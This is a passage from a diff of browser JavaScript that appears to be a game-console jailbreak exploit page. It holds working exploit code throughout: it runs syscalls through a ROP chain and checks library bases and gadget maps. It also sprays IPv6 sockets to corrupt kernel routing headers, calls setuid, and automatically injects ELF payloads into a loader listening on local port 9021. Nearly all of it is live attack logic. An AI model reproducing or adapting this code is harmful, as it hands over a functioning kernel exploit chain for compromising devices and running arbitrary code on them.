+    const sleepMs = (ms) => new Promise((r) => setTimeout(r, ms));
+    try {
+        let lastConnectError = null;
+        for (let attempt = 1; attempt <= PAYLOAD_CONNECT_ATTEMPTS; ++attempt) {
+            let result = await sys(SYS_SOCKET, 2, 1, 0);
+            if (result.failed || result.s32 < 0)
+                throw payloadSyscallError("socket", result);
+            fd = result.s32;
+            track(fd);
+
+            result = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x0800,
+                payloadSocketOptionStore.ptr, 4);
+            if (result.failed || result.s32 !== 0)
+                throw payloadSyscallError("setsockopt SO_NOSIGPIPE", result);
+
+            result = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x1005,
+                payloadSendTimeoutStore.ptr, 0x10);
+            if (result.failed || result.s32 !== 0)
+                throw payloadSyscallError("setsockopt SO_SNDTIMEO", result);
+
+            result = await sys(SYS_CONNECT, fd, payloadSockaddrStore.ptr, 0x10);
+            if (!result.failed && result.s32 === 0) {
+                if (attempt > 1)
+                    flushMark("ELF-CONNECT-OK", "attempt=" + attempt
+                        + "-of-" + PAYLOAD_CONNECT_ATTEMPTS
+                        + "-port=" + PAYLOAD_PORT);
+                lastConnectError = null;
+                break;
+            }
+
+            lastConnectError = payloadSyscallError(
+                "connect to 127.0.0.1:" + PAYLOAD_PORT
+                    + " (attempt " + attempt + "/" + PAYLOAD_CONNECT_ATTEMPTS + ")",
+                result);
+            flushMark("ELF-CONNECT-RETRY", "attempt=" + attempt
+                + "-of-" + PAYLOAD_CONNECT_ATTEMPTS
+                + "-why=" + clean(lastConnectError.message));
+
+            try {
+                const closeRes = await sys(SYS_CLOSE, fd);
+                if (!closeRes.failed && closeRes.s32 === 0)
+                    untrack(fd);
+                else
+                    throw payloadSyscallError("close after connect miss", closeRes);
+            } catch (closeErr) {
+                payloadSenderBlocked = "payload sending is blocked until reboot because "
+                    + "socket fd " + fd + " was not confirmed closed after a connect miss";
+                throw closeErr;
+            }
+            fd = -1;
+            if (attempt === PAYLOAD_CONNECT_ATTEMPTS)
+                throw lastConnectError;
+            await sleepMs(PAYLOAD_CONNECT_GAP_MS);
+        }
+        if (fd < 0)
+            throw lastConnectError || new Error("connect to 127.0.0.1:"
+                + PAYLOAD_PORT + " failed");
+
+        while (sent < bytes.length) {
+            const blockSize = Math.min(PAYLOAD_BUFFER_SIZE, bytes.length - sent);
+            payloadSendStore.u8.set(bytes.subarray(sent, sent + blockSize), 0);
+            let blockSent = 0;
+            while (blockSent < blockSize) {
+                let result = await sys(SYS_WRITE, fd,
+                    payloadSendStore.ptr.add32(blockSent), blockSize - blockSent);
+                if (result.failed || result.s32 <= 0)
+                    throw payloadSyscallError("write at byte "
+                        + (sent + blockSent), result);
+                blockSent += result.s32;
+            }
+            sent += blockSize;
+        }
+    } catch (error) {
+        failure = error;
+    }
+
+    if (fd >= 0 && !chainDead) {
+        try {
+            const result = await sys(SYS_CLOSE, fd);
+            if (result.failed || result.s32 !== 0) {
+                const error = payloadSyscallError("close", result);
+                if (failure === null && sent === bytes.length)
+                    closeWarning = error;
+                else if (failure === null)
+                    failure = error;
+                else
+                    failure = new Error(failure.message + "; additionally, "
+                        + error.message);
+            } else {
+                untrack(fd);
+            }
+        } catch (error) {
+            if (failure === null && sent === bytes.length)
+                closeWarning = error;
+            else if (failure === null)
+                failure = error;
+            else
+                failure = new Error(failure.message + "; additionally, close failed: "
+                    + (error && error.message ? error.message : error));
+        }
+    } else if (fd >= 0 && failure !== null) {
+        failure = new Error(failure.message + "; socket fd " + fd
+            + " remains tracked because the ROP chain is unusable");
+    }
+
+    if (fd >= 0 && state.fdOpen.has(fd))
+        payloadSenderBlocked = "payload sending is blocked until reboot because "
+            + "socket fd " + fd + " was not confirmed closed";
+
+    if (failure !== null) throw failure;
+    return { name, bytes: sent, target: "127.0.0.1", port: PAYLOAD_PORT,
+        closeWarning: closeWarning };
+}
+
+function payloadTileBaseClass(tile) {
+    return tile && /\bprimary\b/.test(tile.className)
+        ? "payloadTile primary" : "payloadTile";
+}
+
+async function sendPayloadInPlace(name, tile) {
+    if (payloadSenderBlocked) {
+        flushMark("ELF-SEND-SKIPPED", "blocked=" + clean(payloadSenderBlocked));
+        return false;
+    }
+    if (payloadSendBusy) return false;
+    payloadSendBusy = true;
+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    for (let i = 0; i < tiles.length; ++i)
+        tiles[i].className = payloadTileBaseClass(tiles[i]) + " busy";
+    if (tile) {
+        tile.className = payloadTileBaseClass(tile);
+        setPayloadTileState(tile, "sending");
+    }
+    let ok = false;
+    try {
+        const result = await sendPayloadToElfldr(name);
+        if (tile) {
+            tile.className = payloadTileBaseClass(tile);
+            setPayloadTileState(tile, "sent");
+        }
+        flushMark("ELF-SENT", "name=" + clean(result.name) + "-bytes="
+            + result.bytes + "-target=" + clean(result.target)
+            + "-port=" + result.port);
+        if (result.closeWarning)
+            flushMark("ELF-SOCKET-CLOSE-WARN", "name=" + clean(result.name)
+                + "-why=" + clean(result.closeWarning.message || result.closeWarning));
+        ok = true;
+    } catch (error) {
+        if (tile) {
+            tile.className = payloadTileBaseClass(tile);
+            setPayloadTileState(tile, "failed");
+        }
+        flushMark("ELF-SEND-FAILED", "name=" + clean(name) + "-why="
+            + clean(error && error.message ? error.message : error));
+        ok = false;
+    } finally {
+        if (payloadSenderBlocked) {
+            payloadSendBusy = true;
+            for (let i = 0; i < tiles.length; ++i)
+                tiles[i].className = payloadTileBaseClass(tiles[i]) + " busy";
+            setCatResult(false);
+            flushMark("ELF-SENDER-BLOCKED", clean(payloadSenderBlocked));
+        } else {
+            payloadSendBusy = false;
+            for (let i = 0; i < tiles.length; ++i)
+                if (tiles[i] !== tile)
+                    tiles[i].className = payloadTileBaseClass(tiles[i]);
+            try { if (tile) tile.focus(); } catch (e) { }
+        }
+    }
+    return ok;
+}
+
+{
+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    for (let i = 0; i < tiles.length; ++i) {
+        const tile = tiles[i];
+        tile.onclick = function (e) {
+            if (e && e.preventDefault) e.preventDefault();
+            sendPayloadInPlace(tile.getAttribute("data-name"), tile);
+            return false;
+        };
+    }
+}
+
+let pldmgrAutoStarted = false;
+async function autoInjectpldmgr() {
+    if (pldmgrAutoStarted) return;
+    pldmgrAutoStarted = true;
+    const tile = payloadMenuEl.querySelector('[data-name="pldmgr.elf"]');
+    const retry = document.getElementById("retryInject");
+    setReactorState("inject");
+    setStageChip("pldmgr", "on");
+    stage("INJECTING pldmgr (waiting for :9021)", "");
+    flushMark("pldmgr-AUTO-START", "name=pldmgr.elf-connectAttempts="
+        + PAYLOAD_CONNECT_ATTEMPTS);
+    const ok = await sendPayloadInPlace("pldmgr.elf",
+        tile || payloadMenuEl.getElementsByTagName("a")[0]);
+    if (ok) {
+        setReactorState("online");
+        setStageChip("pldmgr", "done");
+        stageEl.textContent = "PAYLOAD MANAGER ONLINE";
+        stageEl.className = "ok";
+        syncStageChips("pldmgr online", "ok");
+        flushMark("pldmgr-AUTO-OK", "name=pldmgr.elf");
+        if (retry) retry.className = "";
+    } else if (payloadSenderBlocked) {
+        setReactorState("bad");
+        setStageChip("pldmgr", "fail");
+        stageEl.textContent = "pldmgr BLOCKED — REBOOT REQUIRED";
+        stageEl.className = "bad";
+        if (retry) {
+            retry.className = "";
+            retry.textContent = "REBOOT REQUIRED";
+            retry.disabled = true;
+        }
+        flushMark("pldmgr-AUTO-BLOCKED", clean(payloadSenderBlocked));
+    } else {
+        setReactorState("inject-fail");
+        setStageChip("pldmgr", "fail");
+        stageEl.textContent = "pldmgr INJECT FAILED — RETRY OR REBOOT";
+        stageEl.className = "bad";
+        if (retry) {
+            retry.disabled = false;
+            retry.textContent = "RETRY pldmgr INJECT";
+            retry.className = "on";
+        }
+        flushMark("pldmgr-AUTO-FAIL", "name=pldmgr.elf");
+    }
+}
+
+{
+    const retry = document.getElementById("retryInject");
+    if (retry) {
+        retry.onclick = function () {
+            if (payloadSenderBlocked) {
+                stageEl.textContent = "pldmgr BLOCKED — REBOOT REQUIRED";
+                stageEl.className = "bad";
+                flushMark("pldmgr-RETRY-DENIED", clean(payloadSenderBlocked));
+                return;
+            }
+            if (payloadSendBusy) {
+                flushMark("pldmgr-RETRY-BUSY", "sender-still-busy");
+                return;
+            }
+            pldmgrAutoStarted = false;
+            retry.className = "";
+            autoInjectpldmgr();
+        };
+    }
+    const diag = document.getElementById("dt");
+    if (diag) {
+        diag.onclick = function () {
+            document.body.classList.toggle("debug");
+            if (diag) diag.textContent = document.body.classList.contains("debug") ? "HIDE" : "DIAG";
+        };
+    }
+    const drawerToggle = document.getElementById("drawerToggle");
+    const deepDrawer = document.getElementById("deepDrawer");
+    if (drawerToggle && deepDrawer) {
+        drawerToggle.onclick = function () {
+            const on = deepDrawer.className === "on";
+            deepDrawer.className = on ? "" : "on";
+            drawerToggle.textContent = on ? "DEEP LOG" : "HIDE DEEP LOG";
+        };
+    }
+}
+
+function setReactorState(mode) {
+    const reactor = document.getElementById("reactor");
+    const badge = document.getElementById("badge");
+    const retry = document.getElementById("retryInject");
+    if (!reactor) return;
+    reactor.className = "reactor" + (mode ? " " + mode : "");
+    if (badge) badge.className = mode === "online" ? "on" : "";
+    if (retry) retry.className = mode === "inject-fail" ? "on" : "";
+}
+
+function setStageChip(name, state) {
+    const chip = document.querySelector('#stageRail [data-chip="' + name + '"]');
+    if (!chip) return;
+    chip.className = "stage-chip" + (state ? " " + state : "");
+}
+
+function syncStageChips(text, cls) {
+    const t = String(text || "").toLowerCase();
+    if (/webkit|primitive|deserializer|exploit attempt/.test(t))
+        setStageChip("webkit", cls === "bad" ? "fail" : "on");
+    if (/prepare|rop|gadget|module base|worker/.test(t)) {
+        setStageChip("webkit", "done");
+        setStageChip("rop", cls === "bad" ? "fail" : "on");
+    }
+    if (/stage|kernel|poops|kqueue|pipe|jail|setuid/.test(t)) {
+        setStageChip("webkit", "done");
+        setStageChip("rop", "done");
+        setStageChip("kernel", cls === "bad" ? "fail" : "on");
+    }
+    if (/elf loader|elfldr|stage5|loader ready/.test(t)) {
+        setStageChip("webkit", "done");
+        setStageChip("rop", "done");
+        setStageChip("kernel", "done");
+        setStageChip("elfldr", cls === "bad" ? "fail" : "on");
+    }
+    if (/pldmgr|payload manager|inject/.test(t)) {
+        setStageChip("elfldr", "done");
+        setStageChip("pldmgr", cls === "bad" ? "fail" : (cls === "ok" ? "done" : "on"));
+    }
+}
+
+function stage(text, cls) {
+    if (cls === "bad") setCatResult(false);
+    if (elfldrSpawned && cls === "bad") return;
+    stageEl.textContent = text;
+    stageEl.className = cls || "";
+    syncStageChips(text, cls);
+    const live = document.getElementById("liveStrip");
+    if (live) {
+        const tone = cls === "ok" ? "ok" : (cls === "bad" ? "hot" : "hot");
+        live.innerHTML = "<span class=\"" + tone + "\">› " + String(text || "")
+            .replace(/</g, "&lt;").replace(/>/g, "&gt;") + "</span>";
+    }
+    if (cls === "ok") {
+        const reactor = document.getElementById("reactor");
+        if (reactor && reactor.className.indexOf("online") < 0
+            && reactor.className.indexOf("inject") < 0) {
+            setReactorState("ok pulse");
+            setTimeout(function () {
+                const r = document.getElementById("reactor");
+                if (r && r.className.indexOf("pulse") >= 0)
+                    r.className = r.className.replace(/\bpulse\b/g, "").replace(/\s+/g, " ").trim();
+            }, 220);
+        }
+    } else if (cls === "bad") {
+        setReactorState("bad");
+    }
+}
+function danger(text) {
+    if (elfldrSpawned) return;
+    setCatResult(false);
+    dangerEl.textContent = text;
+    dangerEl.className = "";
+}
+
+function clearFailureBanners() {
+    dangerEl.textContent = "";
+    dangerEl.className = "";
+    verdictEl.textContent = "";
+    verdictEl.className = "";
+}
+
+function setCatResult(success) {
+    const failureMessage = document.getElementById("failureMessage");
+    if (failureMessage) failureMessage.className = success ? "" : "on";
+    if (!success) setReactorState("bad");
+    else if (document.getElementById("reactor")
+        && document.getElementById("reactor").className.indexOf("online") < 0
+        && document.getElementById("reactor").className.indexOf("inject") < 0)
+        setReactorState("ok");
+}
+
+function verdictBanner(kind, text) {
+    if (kind === "bad") setCatResult(false);
+    if (elfldrSpawned && kind === "bad") return;
+    verdictEl.textContent = text;
+    verdictEl.className = kind || "";
+}
+function vitals(text) { vitalsEl.textContent = text; vitalsEl.className = "on"; }
+
+function showVerdict(reboot, text) {
+    if (reboot) setCatResult(false);
+    if (elfldrSpawned && reboot) {
+        rebootEl.textContent = "ELF LOADER READY";
+        rebootEl.className = "on fine";
+        return;
+    }
+    rebootEl.textContent = text;
+    rebootEl.className = reboot ? "" : "fine";
+}
+
+function vitalsText(prefix) {
+    const common = prefix + cfg.sockets + " IPv6 SOCKETS (up to "
+        + (cfg.sockets * 360) + " BYTES of kernel routing headers, sprayed and " + "freed repeatedly), 2 AF_UNIX SOCKETPAIRS, 2 PIPES, and TWELVE " + "raw kernel threads pinned to one core at PRI_REALTIME/256.\n";
+    if (cfg.trigger === "none")
+        return common
+            + "TRIGGER: NONE";
+    if (cfg.trigger === "netcontrol")
+        return common
+            + "TRIGGER: NETCONTROL";
+    return common
+        + "TRIGGER: OVERFLOW (p2jb's prepare_fds)" + "corrupt the kernel if burn=full.\n" + "  * RLIMIT_NOFILE raised, up to " + 2048 + " descriptors opened.\n" + "  * setuid(1) x2 -- IRREVERSIBLE for the rest of the boot.\n" + "  * burn=" + cfg.burn + "";
+}
+
+let chainMarksQuiet = false;
+function jbMarkSink(tag, extra) {
+    if (chainMarksQuiet) queueEvent(tag, extra);
+    else flushMark(tag, extra);
+}
+function setChainMarksQuiet(quiet) {
+    const was = chainMarksQuiet;
+    chainMarksQuiet = !!quiet;
+    return was;
+}
+if (!window.jb) window.jb = {};
+if (typeof window.jb.mark !== "function") window.jb.mark = jbMarkSink;
+
+function row(idx, entry, status, detail, notes) {
+    let tr = rowByKey.get(entry.key);
+    if (tr === undefined) {
+        tr = document.createElement("tr");
+        tr.innerHTML = '<td class="n"></td><td class="k"></td>'
+            + '<td class="st"></td><td class="d"></td>';
+        rowsEl.appendChild(tr);
+        rowByKey.set(entry.key, tr);
+    }
+    tr.children[0].textContent = String(idx);
+    tr.children[1].innerHTML = "";
+    const nm = document.createElement("span");
+    nm.textContent = entry.label;
+    const cl = document.createElement("span");
+    cl.className = "cls";
+    cl.textContent = entry.cls;
+    tr.children[1].appendChild(nm);
+    tr.children[1].appendChild(cl);
+    tr.children[2].textContent = status;
+    tr.children[2].className = "st " + status;
+
+    tr.className = "r-" + status;
+
+    const d = tr.children[3];
+    d.innerHTML = "";
+    const main = document.createElement("span");
+    main.className = status === "FAIL" ? "why" : "";
+    main.textContent = detail || "";
+    d.appendChild(main);
+    for (const n of (notes || [])) {
+        const s = document.createElement("span");
+        s.className = "note";
+        s.textContent = "> " + n;
+        d.appendChild(s);
+    }
+    return tr;
+}
+
+const CARRY_PARAMS = { payload: /^(1|dry)$/ };
+function carryParams(href) {
+    const keep = [];
+    for (const k of Object.keys(CARRY_PARAMS)) {
+        const v = Q.get(k);
+        if (v !== null && CARRY_PARAMS[k].test(v)) keep.push(k + "=" + v);
+    }
+    if (!keep.length) return href;
+    return href + (href.indexOf("?") >= 0 ? "&" : "?") + keep.join("&");
+}
+
+function link(href, text, kind) {
+    const a = document.createElement("a");
+    a.href = carryParams(href);
+    a.tabIndex = navLive ? -1 : 0;
+    a.textContent = text;
+    if (kind) a.className = kind;
+    navEl.appendChild(a);
+}
+
+let navLive = false;
+let runInFlight = false;
+
+function unloadBeacon(kind) {
+    try { unloadBeaconInner(kind); } catch (e) {
+        try { window.__jbRaw("UNLOAD-BEACON-THREW", (e && e.message) || e); }
+        catch { }
+    }
+}
+function unloadBeaconInner(kind) {
+    const liveSockets = engine ? engine.TW.S.n : 0;
+    const liveFds = state.fdOpen.size;
+    if (!runInFlight && !liveSockets && !liveFds && !chainDead) return;
+    flushMark("PAGE-LEFT-MID-RUN", kind + "-at=" + (currentKey || "boot")
+        + "-phase=" + (runInFlight ? "in-run" : "after-run")
+        + "-sockets=" + liveSockets
+        + "-trackedFds=" + liveFds
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-alias=" + (engine && engine.corrupt ? 1 : 0)
+        + "-triplet=" + (engine && engine.TW.tripletsValid() ? 1 : 0)
+        + "-chainDead=" + (chainDead ? clean(chainDead) : "no")
+        + "-latch=" + (latchState || "unknown"));
+}
+window.addEventListener("pagehide", () => unloadBeacon("pagehide"));
+window.addEventListener("beforeunload", () => unloadBeacon("beforeunload"));
+
+function lockNav(live) {
+    navLive = live;
+    navEl.hidden = live;
+    navEl.style.pointerEvents = live ? "none" : "";
+    const as = navEl.getElementsByTagName("a");
+    for (let i = 0; i < as.length; ++i) as[i].tabIndex = live ? -1 : 0;
+}
+
+const WATCHDOG_MS = 15000;
+let P = null, chain = null;
+let chainDead = "";
+let syscallCount = 0;
+let errConvention = "posix";
+
+function numText(n) {
+    return "0x" + n.toString(16).toUpperCase().padStart(3, "0");
+}
+function classify(raw) {
+    const hi = raw.hi >>> 0, lo = raw.low >>> 0;
+    const failed = (hi === 0xffffffff) && (lo >= 0xfffff000);
+    return { failed, s32: lo | 0 };
+}
+function errText(res) {
+    if (!res.failed) return "ok";
+    const n = -res.s32;
+    if (errConvention === "raw") {
+        if (res.s32 === -1)
+            return "ret=-1 (ambiguous: -1 is also the POSIX failure sentinel)";
+        return "errno " + n + (ERRNO[n] ? " " + ERRNO[n] : "");
+    }
+    if (res.s32 === -1) return "ret=-1, errno set but not readable from here";
+    return "ret=" + res.s32 + " (would be " + (ERRNO[n] || ("errno " + n))
+        + " if the stubs returned -errno)";
+}
+
+function killChain(what) {
+    chainDead = what;
+    state.cleanupFailed = state.cleanupFailed || ("the ROP chain died at '"
+        + what + "'");
+    flushMark("CHAIN-DEAD", what);
+}
+
+async function watchdog(promise, what) {
+    let timer = null;
+    try {
+        return await Promise.race([
+            promise,
+            new Promise((_, rej) => {
+                timer = setTimeout(() => rej(new Error("WATCHDOG")), WATCHDOG_MS);
+            })
+        ]);
+    } catch (err) {
+        if (err && err.message === "WATCHDOG") killChain(what);
+        throw err;
+    } finally {
+        if (timer !== null) clearTimeout(timer);
+    }
+}
+
+async function sys(num, a, b, c, d, e, f) {
+    if (chainDead)
+        throw new Error("sys: the chain is unusable after '" + chainDead + "'");
+    if (Object.prototype.hasOwnProperty.call(BANNED, num))
+        throw new Error("sys: syscall " + numText(num) + " is BANNED -- "
+            + BANNED[num]);
+    if (P.syscalls[num] === undefined)
+        throw new Error("sys: " + numText(num) + " has no stub in the 5.50 map");
+    syscallCount++;
+    state.syscallsIssued.add(num);
+    const t0 = Date.now();
+    const raw = await watchdog(chain.syscall(num, a, b, c, d, e, f),
+        "syscall " + numText(num));
+    state.roundTrips.push(Date.now() - t0);
+    const cl = classify(raw);
+    const res = { raw, s32: cl.s32, failed: cl.failed,
+        hex: "0x" + raw.toString(), errText: "" };
+    res.errText = errText(res);
+    return res;
+}
+
+async function runChain() {
+    if (chainDead)
+        throw new Error("runChain: the chain is unusable after '" + chainDead + "'");
+    const t0 = Date.now();
+    await watchdog(chain.run(), "chain.run");
+    state.roundTrips.push(Date.now() - t0);
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function mem(n) {
+    const ptr = P.malloc(n, 1);
+    return { ptr, u8: ptr.backing };
+}
+
+const state = {
+    syscallsIssued: new Set(),
+    roundTrips: [],
+    heapBytes: 0,
+    syncBlocks: 0, syncBytes: 0,
+    threadObjectsBuilt: 0, threadsCreated: 0, threadsExited: 0,
+    tornWrites: [],
+    groups: [],
+    fdOpen: new Set(), fdBaseline: -1,
+    cleanupFailed: ""
+};
+const track = fd => state.fdOpen.add(fd);
+const untrack = fd => state.fdOpen.delete(fd);
+let currentNotes = [];
+const note = s => {
+    currentNotes.push(s);
+    queueEvent("NOTE", (currentKey ? currentKey + "-" : "")
+        + String(s).replace(/[\r\n\t]+/g, " ")
+            .replace(/[^\x20-\x7e]/g, "").slice(0, 300));
+};
+const PASS = detail => ({ status: "PASS", detail });
+const FAIL = detail => ({ status: "FAIL", detail });
+
+const NA = detail => ({ status: "SKIP", detail });
+
+const driver = {
+    origMaskBytes: null, origMaskHex: "", origPrioType: -1, origPrio: -1,
+    core: -1, coreWhy: "", tid: 0, pid: 0, pinned: false,
+
+    prioChanged: false, affChanged: false
+};
+
+const nogcHard = { carrier: null, p: null, chain: null };
+
+async function preflight() {
+    if (typeof prepare !== "function")
+        throw new Error("main.js did not evaluate -- `prepare` is undefined.");
+    if (typeof worker_rop !== "function")
+        throw new Error("rop.js did not evaluate -- `worker_rop` is undefined");
+    if (typeof SYS_GETPID === "undefined")
+        throw new Error("syscalls.js did not evaluate -- SYS_GETPID is undefined");
+
+    await window.offsetsReady;
+    flushMark("OFFSETS-READY", "fw=" + window.fw_str
+        + "-gadgets=" + Object.keys(wk_gadgetmap).length
+        + "-syscalls=" + Object.keys(syscall_map).length);
+
+    if (!wk_gadgetmap || !Object.keys(wk_gadgetmap).length
+        || !syscall_map || !Object.keys(syscall_map).length)
+        throw new Error("../offsets/" + window.fw_str + ".js loaded but is empty: "
+            + Object.keys(wk_gadgetmap || {}).length + " gadgets, "
+            + Object.keys(syscall_map || {}).length + " syscalls.");
+
+    let verdict = "ok";
+    try {
+        const r = await fetch("rop_slave.js", { cache: "no-store" });
+        if (!r.ok) verdict = "http-" + r.status;
+    } catch (err) { verdict = "fetch-threw"; }
+    if (verdict === "ok") {
+        let w = null;
+        verdict = await new Promise(resolve => {
+            let done = false;
+            const finish = v => {
+                if (done) return;
+                done = true;
+                try { if (w) w.terminate(); } catch { }
+                resolve(v);
+            };
+            const t = setTimeout(() => finish("timeout"), 4000);
+            try {
+                w = new Worker("rop_slave.js");
+                w.onmessage = () => { clearTimeout(t); finish("ok"); };
+                w.onerror = () => { clearTimeout(t); finish("worker-error"); };
+                w.postMessage(0);
+            } catch (err) { clearTimeout(t); finish("worker-threw"); }
+        });
+    }
+    flushMark("WORKER-PROBE", verdict);
+    if (verdict !== "ok")
+        throw new Error("rop_slave.js is not usable (" + verdict + ")");
+}
+
+function assertInt64Identity() {
+    if (globalThis.int64 !== int64)
+        throw new Error("int64: two constructors in the page");
+    flushMark("INT64-IDENTITY-OK", "");
+}
+
+function assertBases() {
+    const named = [
+        ["wk", P.libSceNKWebKitBase],
+        ["lc", P.libSceLibcInternalBase],
+        ["lk", P.libKernelBase]
+    ];
+    const parts = [];
+    for (const [n, b] of named) {
+        flushMark("BASE-PRE", n + "=0x" + b.toString() + "-check=band+align");
+        if ((b.low & 0x3fff) !== 0)
+            throw new Error(n + " base 0x" + b.toString() + " is not aligned");
+        if ((b.hi >>> 0) !== 8)
+            throw new Error(n + " base 0x" + b.toString() + " is outside the band");
+        parts.push(n + "=0x" + b.toString());
+    }
+    flushMark("BASES", parts.join("-") + "-band=ok-align=0x4000");
+    if (typeof OFFSET_wk___stack_chk_guard_import === "number"
+        && typeof OFFSET_lk___stack_chk_guard === "number") {
+        const slot = P.libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import);
+        flushMark("BASE-XCHECK-PRE", "slot=0x" + slot.toString() + "-next=read8");
+        const seen = P.read8(slot);
+        const derived = seen.sub32(OFFSET_lk___stack_chk_guard);
+        const agree = derived.low === P.libKernelBase.low
+            && derived.hi === P.libKernelBase.hi;
+        flushMark("BASE-XCHECK", "derived-lk=0x" + derived.toString()
+            + "-prepare-lk=0x" + P.libKernelBase.toString() + "-agree=" + agree);
+        if (!agree)
+            throw new Error("libkernel base disagreement");
+    }
+}
+
+async function probeErrnoConvention() {
+    const r = await sys(0x006, 0x7fffffff);
+    if (r.failed && r.s32 === -1) errConvention = "posix";
+    else if (r.failed) errConvention = "raw";
+    else errConvention = "unknown";
+    flushMark("ERRNO-CONVENTION", errConvention + "-ret=" + r.s32);
+}
+
+const REFERENCE_CHAIN_ENTRY = "run_" + "ps" + "free";
+function refuseReferenceChain() {
+    if (typeof window[REFERENCE_CHAIN_ENTRY] === "function") {
+        flushMark("REFERENCE-CHAIN-PRESENT-REFUSING", REFERENCE_CHAIN_ENTRY);
+        stage("refusing to run -- the reference chain's entry point is loaded",
+            "bad");
+        throw new Error("the reference chain's entry point is present");
+    }
+    flushMark("REFERENCE-CHAIN-ABSENT", "only-slopkit-can-satisfy-this-page");
+}
+
+async function chooseCore() {
+    const m = mem(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) m.u8[i] = 0;
+    flushMark("INHERITED-MASK-PRE", "syscall=cpuset_getaffinity-0x1E7-buf=0x"
+        + m.ptr.toString());
+    const r = await sys(0x1E7, K.CPU_LEVEL_WHICH, K.CPU_WHICH_TID,
+        new int64(0xffffffff, 0xffffffff), K.CPUSET_SIZE, m.ptr);
+    if (r.failed)
+        throw new Error("cpuset_getaffinity failed (" + r.errText
+            + "). Refusing to pin anything blind.");
+    const bytes = new Uint8Array(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
+    const word = r32(bytes, 0);
+    driver.origMaskBytes = bytes;
+    driver.origMaskHex = hexBytes(bytes, 0, K.CPUSET_SIZE);
+    flushMark("INHERITED-MASK", "mask=0x" + word.toString(16) + "-cores="
+        + coreList(word) + "-bytes=" + driver.origMaskHex);
+    if (word === 0)
+        throw new Error("the inherited affinity mask is 0");
+    let core = -1;
+    if (CORE_OVERRIDE >= 0) {
+        if (CORE_OVERRIDE > 15 || ((word >>> CORE_OVERRIDE) & 1) === 0)
+            throw new Error("?core=" + CORE_OVERRIDE + " is not set in the "
+                + "inherited mask 0x" + word.toString(16) + " (available: "
+                + coreList(word) + "). cpuset_setaffinity would fail and every "
+                + "test below would still appear to work.");
+        core = CORE_OVERRIDE;
+        driver.coreWhy = "chosen explicitly with ?core=" + CORE_OVERRIDE
+            + " and confirmed present in the inherited mask";
+    } else {
+        for (let i = 15; i >= 0; --i) if ((word >>> i) & 1) { core = i; break; }
+        driver.coreWhy = "the highest core set in the INHERITED mask 0x"
+            + word.toString(16) + " (available: " + coreList(word) + "). "
+            + "Derived, not hardcoded: poops.c:52 uses 5 and p2jb.js:193 uses "
+            + "4, and neither exists here.";
+    }
+    if (core < 0 || core > 15)
+        throw new Error("no usable core in 0..15 from mask 0x" + word.toString(16));
+    driver.core = core;
+    flushMark("CORE-CHOSEN", "core=" + core);
+    return core;
+}
+
+let engine = null;
+let LADDER = [];
+let currentKey = "";
+let ctx = null;
+
+function makeContext() {
+    ctx = {
+        P, chain, i64: (lo, hi) => new int64(lo, hi),
+        sys, runChain, mem, flushMark, queueEvent, sleep, note, PASS, FAIL, NA,
+        track, untrack, state, cfg, latch, stage, driver,
+        WATCHDOG_MS, setChainMarksQuiet,
+
+        setRaceMode, repaintScreen,
+
+        markStats, flushQueue, verdictBanner,
+        chainDeadNow: () => !!chainDead,
+        measured: {},
+        stalledAt: STALLED_AT, lastRun: LAST_RUN,
+        filteredRun: FILTERED_RUN, only: ONLY.slice(), from: FROM
+    };
+    engine = makePoopsEngine(ctx);
+    engine.setFamily(cfg.trigger);
+    return ctx;
+}
+
+let cleanupClaimed = false;
+
+async function runLadder() {
+    const X = ctx;
+    LADDER = buildLadder(X, engine);
+
+    let passed = 0, failed = 0, skipped = 0, filtered = 0;
+    let started = false, aborted = "";
+
+    for (let i = 0; i < LADDER.length; ++i)
+        row(i + 1, LADDER[i], "SKIP", "queued");
+
+    for (let i = 0; i < LADDER.length; ++i) {
+        const entry = LADDER[i];
+
+        if (entry.key === "ps7_report") continue;
+        if (ONLY.length && ONLY.indexOf(entry.key) < 0) {
+            filtered++;
+            row(i + 1, entry, "SKIP", "not in ?only=");
+            continue;
+        }
+        if (!ONLY.length && FROM && !started) {
+            if (entry.key !== FROM) {
+                filtered++;
+                row(i + 1, entry, "SKIP", "before ?from=" + FROM);
+                continue;
+            }
+            started = true;
+        }
+        if (state.cleanupFailed) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "REFUSED -- an earlier step could not "
+                + "clean up: " + state.cleanupFailed);
+            continue;
+        }
+        if (chainDead) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "chain unusable after '" + chainDead
+                + "'. Even the teardown is a chain round trip.");
+            continue;
+        }
+
+        storeSet(PROGRESS_KEY, entry.key);
+        currentKey = entry.key;
+        currentNotes = [];
+        row(i + 1, entry, "RUN", "running...");
+        flushMark("TEST-ENTER", entry.key
+            + (entry.hot ? "-chainMarks=queued" : "-chainMarks=blocking"));
+        let result;
+        const wasQuiet = setChainMarksQuiet(!!entry.hot);
+        try {
+            result = await entry.run();
+            if (!result) result = FAIL("the test returned nothing");
+        } catch (err) {
+            const m = (err && err.message) || String(err);
+            if (m === "WATCHDOG") {
+                aborted = entry.key;
+                result = FAIL("WATCHDOG: no reply from the ROP worker in "
+                    + WATCHDOG_MS + " ms. launch_chain has no timeout of its "
+                    + "own (main.js:393-399).");
+            } else {
+                result = FAIL("THREW " + (err && err.name) + ": " + m.slice(0, 400));
+            }
+        } finally {
+            setChainMarksQuiet(wasQuiet);
+        }
+        if (result.status === "PASS") passed++;
+        else if (result.status === "SKIP") skipped++;
+        else failed++;
+        row(i + 1, entry, result.status, result.detail, currentNotes);
+        flushMark("TEST", entry.key + "-" + result.status
+            + (result.detail
+                ? "-why=" + String(result.detail).replace(/[\r\n\t]+/g, " ")
+                    .replace(/[^\x20-\x7e]/g, "").slice(0, 400)
+                : ""));
+        if (state.cleanupFailed) danger("cleanup failure: " + state.cleanupFailed);
+
+        if (aborted || result.status === "FAIL") {
+            if (!aborted) aborted = entry.key + " (FAIL)";
+            for (let k = i + 1; k < LADDER.length; ++k) {
+                if (LADDER[k].key === "ps7_report") continue;
+                skipped++;
